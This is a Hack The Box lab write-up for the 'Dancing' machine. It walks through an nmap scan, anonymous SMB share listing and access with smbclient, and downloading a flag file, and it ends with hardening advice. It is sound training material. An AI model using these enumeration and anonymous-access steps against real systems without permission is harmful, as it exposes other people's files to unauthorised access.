# HTB Dancing — Writeup

## Overview

**Machine:** Dancing
**Platform:** Hack The Box Starting Point
**Difficulty:** Very Easy
**Category:** SMB Enumeration
**YouTube Link:** https://youtu.be/Sb4mNjcDvpA

This machine focuses on **enumerating SMB shares** and accessing files through anonymous authentication.

---

# Step 1 — Initial Reconnaissance

The first step in any penetration test is **port scanning** to identify running services.

### Nmap Scan

```bash
nmap -sC -sV <TARGET-IP>
```

### Example Output

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

### Analysis

These ports indicate that **SMB (Server Message Block)** is running on the system.

Important SMB ports:

| Port | Service                 |
| ---- | ----------------------- |
| 139  | NetBIOS Session Service |
| 445  | SMB over TCP            |

Since SMB is available, the next step is **enumerating SMB shares**.

---

# Step 2 — Enumerate SMB Shares

We can list available shares using **smbclient**.

```bash
smbclient -L //<TARGET-IP> -N
```

`-L` → List shares
`-N` → Null authentication (no password)

### Output

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

The interesting share here is:

```
WorkShares
```

---

# Step 3 — Access the SMB Share

Connect to the share using:

```bash
smbclient //<TARGET-IP>/WorkShares -N
```

If successful, you will get an SMB shell:

```
smb: \>
```

---

# Step 4 — Enumerate Files

List files inside the share.

```bash
ls
```

Example output:

```
.
..
flag.txt
```

---

# Step 5 — Download the Flag

Use the `get` command to download the file.

```bash
get flag.txt
```

The file will download to your local machine.

---

# Step 6 — Read the Flag

```bash
cat flag.txt
```

You should see the **HTB flag**.

---

# Key Learning Points

### 1. SMB Enumeration

When ports **139 or 445** are open, always enumerate SMB shares.

Common tools:

* smbclient
* smbmap
* enum4linux

---

### 2. Null Authentication

Some SMB servers allow **anonymous login**.

Example:

```
username: guest
password: (blank)
```

or using:

```
-N
```

This is a **misconfiguration** that allows attackers to access files.

---

# Useful Commands Recap

### Nmap Scan

```bash
nmap -sC -sV <TARGET-IP>
```

### List SMB Shares

```bash
smbclient -L //<TARGET-IP> -N
```

### Connect to Share

```bash
smbclient //<TARGET-IP>/WorkShares -N
```

### List Files

```bash
ls
```

### Download File

```bash
get flag.txt
```

---

# Attack Methodology Summary

1. Perform **Nmap scan**
2. Identify **SMB ports (139, 445)**
3. Enumerate shares with **smbclient**
4. Access share using **anonymous login**
5. Download the flag

---

# Skills Learned

* Network service enumeration
* SMB share discovery
* Anonymous authentication exploitation
* File retrieval via SMB

---

# Notes

This machine demonstrates how **misconfigured SMB shares** can expose sensitive files to attackers.

In real environments, administrators should:

* Disable anonymous access
* Restrict share permissions
* Monitor SMB activity
* Use proper authentication controls

---
# HTB Answers

# Dancing Flag
